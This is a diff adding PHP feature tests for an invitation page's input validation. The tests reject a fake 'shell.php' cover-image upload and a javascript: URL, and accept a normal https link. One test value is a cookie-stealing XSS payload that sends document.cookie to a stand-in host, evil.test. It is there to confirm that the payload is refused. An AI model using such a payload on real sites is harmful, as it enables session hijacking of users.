@@ -254,6 +254,55 @@ class InvitationPurchaseAndManageTest extends TestCase
         Storage::disk('s3')->assertExists($path);
     }
 
+    public function test_uploading_a_non_image_file_as_cover_image_is_rejected(): void
+    {
+        Storage::fake('s3');
+
+        $customer = Customer::factory()->create();
+        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
+        $invitation->template->update(['fields' => ['cover_image']]);
+
+        Livewire::actingAs($customer, 'customer')
+            ->test(InvitationManagePage::class, ['invitation' => $invitation])
+            ->set('imageUploads.cover_image', UploadedFile::fake()->create('shell.php', 10, 'application/x-php'))
+            ->call('save')
+            ->assertHasErrors(['imageUploads.cover_image']);
+
+        $this->assertNull($invitation->fresh()->field_values['cover_image'] ?? null);
+    }
+
+    public function test_a_javascript_uri_in_a_url_field_is_rejected(): void
+    {
+        $customer = Customer::factory()->create();
+        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
+        $invitation->template->update(['fields' => ['cta_label', 'cta_url']]);
+
+        Livewire::actingAs($customer, 'customer')
+            ->test(InvitationManagePage::class, ['invitation' => $invitation])
+            ->set('fieldValues.cta_label', 'Click me')
+            ->set('fieldValues.cta_url', 'javascript:fetch("https://evil.test?c="+document.cookie)')
+            ->call('save')
+            ->assertHasErrors(['fieldValues.cta_url']);
+
+        $this->assertNull($invitation->fresh()->field_values['cta_url'] ?? null);
+    }
+
+    public function test_a_normal_https_url_in_a_url_field_is_accepted(): void
+    {
+        $customer = Customer::factory()->create();
+        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
+        $invitation->template->update(['fields' => ['cta_label', 'cta_url']]);
+
+        Livewire::actingAs($customer, 'customer')
+            ->test(InvitationManagePage::class, ['invitation' => $invitation])
+            ->set('fieldValues.cta_label', 'Click me')
+            ->set('fieldValues.cta_url', 'https://open.spotify.com/playlist/abc')
+            ->call('save')
+            ->assertHasNoErrors();
+
+        $this->assertSame('https://open.spotify.com/playlist/abc', $invitation->fresh()->field_values['cta_url']);
+    }
+
     public function test_adding_a_recipient_generates_a_shareable_link(): void
     {
         $customer = Customer::factory()->create();
